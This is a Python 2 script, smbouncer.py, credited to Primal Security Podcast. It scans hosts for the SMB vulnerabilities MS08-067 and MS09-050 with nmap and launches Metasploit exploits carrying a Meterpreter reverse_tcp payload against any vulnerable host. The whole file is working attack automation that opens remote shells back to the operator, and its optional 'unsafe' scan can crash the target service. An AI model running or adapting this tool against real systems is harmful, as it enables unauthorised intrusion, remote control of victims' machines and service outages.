#################################################################################
#       smbouncer.py - Enumerate/Exploit MS08-067 -> Meterpreter                #
#	Requires Python-Nmap http://xael.org/norman/python/python-nmap/		#
#       Copyrighted:  Primal Security Podcast - www.primalsecurity.net          #
#                                                                               #
#       This program is free software: you can redistribute it and/or modify    #
#       it under the terms of the GNU General Public License as published by    #
#       the Free Software Foundation, either version 3 of the License, or       #
#       (at your option) any later version.                                     #
#                                                                               #
#       This program is distributed in the hope that it will be useful,         #
#       but WITHOUT ANY WARRANTY; without even the implied warranty of          #
#       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           #
#       GNU General Public License for more details.                            #
#                                                                               #
#       You should have received a copy of the GNU General Public License       #
#       along with this program.  If not, see <http://www.gnu.org/licenses/>.   #
#################################################################################


import nmap, os, sys, optparse, subprocess, signal


def scan(RHOST, unsafe):
	nm = nmap.PortScanner()
	if unsafe == True:
        	nm.scan(hosts=RHOST, arguments="-sS --script=smb-check-vulns -p 445 --script-args=unsafe=1")
	else:
		nm.scan(hosts=RHOST, arguments="-sS --script=smb-check-vulns -p 445")
	for host in nm.all_hosts():
		if nm[host].has_tcp(445) == True:
			output = str(nm[host]['hostscript'])
			if 'MS08-067: VULNERABLE' in output:
				print "Launching MS08-067 exploit on "+host
				sploit = 'MS08-067'
				msfsmb(host, sploit)

			if '(CVE-2009-3103): VULNERABLE' in output:
				sploit = 'MS09-050'
				print "Launching MS09-050 exploit on "+host

			else:
				print "MS08-067 or MS09-050 not detected on: "+host

	
def msfsmb(host, sploit):
	LPORT = '44'+host.split('.')[3]
	if sploit == 'MS08-067':
		subprocess.call("sudo gnome-terminal -t \"MSF\" -x bash -c \"msfcli windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/reverse_tcp LHOST="+LHOST+" LPORT="+LPORT+" RHOST="+host+" E;\" &", shell=True)
	if sploit == 'MS09-050':
		subprocess.call("sudo gnome-terminal -t \"MSF\" -x bash -c \"msfcli windows/smb/ms09_050_smb2_negotiate_func_index PAYLOAD=windows/meterpreter/reverse_tcp LHOST="+LHOST+" LPORT="+LPORT+" RHOST="+host+" E;\" &", shell=True)


def signal_handler(signal, frame):              # Function to captures SIGINT and exit
        sys.exit(0)


def main():
        parser = optparse.OptionParser(sys.argv[0] +\
        '-t <target>')
        parser.add_option('-t', dest='RHOST', type='string', \
        help ='Remote Host(s) to Scan')
        parser.add_option('--unsafe', action="store_true", dest="unsafe", \
                help="run --script-args=unsfae=1 with nmap will scan for more SMB vulns but could DoS the service", default=False)
	parser.add_option('-l', dest='LHOST', type='string', \
	help='Local host IP to bind MSF listener')
        (options, args) = parser.parse_args()
	RHOST = options.RHOST
	unsafe = options.unsafe
	global LHOST
	LHOST = options.LHOST

	if (RHOST == None) or (LHOST == None):
		print parser.usage
		sys.exit(0)
	scan(RHOST, unsafe)

	signal.signal(signal.SIGINT, signal_handler)
	print " "
        print "Press Ctrl+c to exit"
        signal.pause()


if __name__=="__main__":
        main()
